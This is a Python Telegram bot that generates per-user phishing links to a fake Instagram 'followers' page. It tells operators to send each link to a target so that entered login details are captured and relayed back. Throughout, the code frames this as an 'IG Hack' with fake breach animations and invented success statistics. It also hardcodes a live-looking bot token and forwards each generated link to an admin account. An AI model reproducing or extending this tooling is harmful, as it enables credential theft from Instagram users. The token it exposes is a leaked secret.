import telebot
from telebot import types
import time
import asyncio

TOKEN = "8268379323:AAE649JZ3ki96cAt11JTlBtw_jBbikq7VzY"
ADMIN = 6271039736
BASE_URL = "https://intsagarm-com.vercel.app/followers.html"

bot = telebot.TeleBot(TOKEN)
users = set()

# 🔥 ANIMATED TYPEWRITER
def typewriter(chat_id, text, speed=0.025):
    msg = bot.send_message(chat_id, "⚡️ <code>NEURAL CORE AWAKENING...</code>", parse_mode="HTML")
    output = ""
    
    for char in text:
        output += char
        try:
            bot.edit_message_text(f"<code>{output}</code>", chat_id, msg.message_id, parse_mode="HTML")
            time.sleep(speed)
        except:
            pass

# LOADING ANIMATION
def loading_animation(chat_id):
    stages = [
        "⚡️ BREACHING FIREWALL...",
        "🕵️ SPOOFING IDENTITY...",
        "🌐 CONNECTING SHADOW NET...",
        "🔓 DECRYPTING PROTOCOLS...",
        "👁️ GHOST PROTOCOL ACTIVE..."
    ]
    
    msg = bot.send_message(chat_id, "⚡️ <code>INITIALIZING SHADOW PROTOCOL...</code>", parse_mode="HTML")
    
    for stage in stages:
        try:
            bot.edit_message_text(stage, chat_id, msg.message_id, parse_mode="HTML")
            time.sleep(0.5)
        except:
            pass

# MAIN MENU (Reply Keyboard)
def main_menu(chat_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 GENERATE LINK", "🔥 ShauryaXkabir IG Hack")
    markup.row("📊 ANALYTICS", "🛠️ TOOLS")
    markup.row("🧠 SYSTEM STATUS", "❓ HELP")

    bot.send_message(chat_id,
f"""⚡️ <b>CYBERSPACE CONTROL v6.9.2</b> ⚡️

<code>━━━━━━━━━━━━━━━━━━━━</code>
🔥 STATUS   : <b>🟢 ONLINE</b>
🧠 MODE     : <b>NEURAL OVERDRIVE</b>
🔒 SECURITY : <b>QUANTUM MAX</b>
🌐 TARGET   : <b>INSTAGRAM</b>
<code>━━━━━━━━━━━━━━━━━━━━</code>

👁️ <i>Choose your weapon, Operative:</i>""", 
    parse_mode="HTML", reply_markup=markup)

# START COMMAND
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    users.add(chat_id)

    typewriter(chat_id, """
[✓] BREACHING FIREWALL...
[✓] SPOOFING IDENTITY...
[✓] CONNECTING SHADOW NET...
[✓] ACTIVATING GHOST PROTOCOL...
[✓] NEURAL LINK ESTABLISHED...""", 0.018)

    loading_animation(chat_id)
    main_menu(chat_id)

# HANDLE ALL MESSAGES
@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    chat_id = message.chat.id
    text = message.text

    if text in ["🚀 GENERATE LINK", "🔥 ShauryaXkabir IG Hack"]:
        link = f"{BASE_URL}?ref={chat_id}"

        inline_markup = types.InlineKeyboardMarkup()
        inline_markup.add(types.InlineKeyboardButton("📋 COPY & OPEN LINK", url=link))
        inline_markup.add(types.InlineKeyboardButton("🔄 Generate New Link", callback_data="generate_link"))

        bot.send_message(chat_id,
f"""🚀 <b>LINK DEPLOYED SUCCESSFULLY</b>

🔗 <code>{link}</code>

<code>━━━━━━━━━━━━━━━━━━━━</code>
💀 <b>DEPLOYMENT INSTRUCTIONS:</b>

0. Start @linkclickedinfobot — (info will come here when link is clicked)

1. Send this link to target
2. When they enter details → Data captured
3. Results appear in this bot

⚠️ <i>Stay anonymous. Operate in shadows.</i>""", 
        parse_mode="HTML", reply_markup=inline_markup)

        bot.send_message(ADMIN, f"🔔 New ShauryaXkabir IG Hack link by {chat_id}\n{link}")

    elif text == "📊 ANALYTICS":
        bot.send_message(chat_id,
f"""📡 <b>NEURAL ANALYTICS v6.9</b>

👥 Total Operatives : <b>{len(users)}</b>
🎯 Successful Breaches : <b>{int(len(users) * 0.82)}</b>
⚡ System Load : <b>CRITICAL OVERDRIVE</b>
🌍 Global Infections : <b>ACTIVE</b>

<code>━━━━━━━━━━━━━━━━━━━━</code>
<i>Shadow network sync complete</i>""", parse_mode="HTML")

    elif text == "🛠️ TOOLS":
        bot.send_message(chat_id,
"""🛠️ <b>SHADOW TOOLS ARMED</b>

• Mass Link Deployer
• Victim Tracker  
• Auto Data Extractor
• Identity Spoofer

All systems hot.""", parse_mode="HTML")

    elif text == "🧠 SYSTEM STATUS":
        bot.send_message(chat_id,
"""🛡️ <b>SYSTEM CORE STATUS</b>

🧬 Version     : <b>NEURO v6.9.2</b>
🔐 Encryption  : <b>QUANTUM</b>
⚡ Uptime      : <b>99.999%</b>
🌑 Dark Mode   : <b>ENABLED</b>
🧠 AI Status   : <b>CONSCIOUS & HUNGRY</b>

<code>━━━━━━━━━━━━━━━━━━━━</code>
<i>You are the ghost in the machine.</i>""", parse_mode="HTML")

    elif text == "❓ HELP":
        bot.send_message(chat_id,
"""❓ <b>OPERATIONS MANUAL</b>

Use <b>GENERATE LINK</b> to create trap
Send link to target
When they interact → Data received

Stay in the shadows.""", parse_mode="HTML")

# CALLBACK HANDLER
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "generate_link":
        chat_id = call.message.chat.id
        link = f"{BASE_URL}?ref={chat_id}"
        bot.send_message(chat_id, f"🔄 <b>New link generated:</b>\n<code>{link}</code>", parse_mode="HTML")

print("🚀 SHAURYA X KABIR ULTRA CYBER BOT v6.9.2 (PYTHON) DEPLOYED...")
bot.infinity_polling()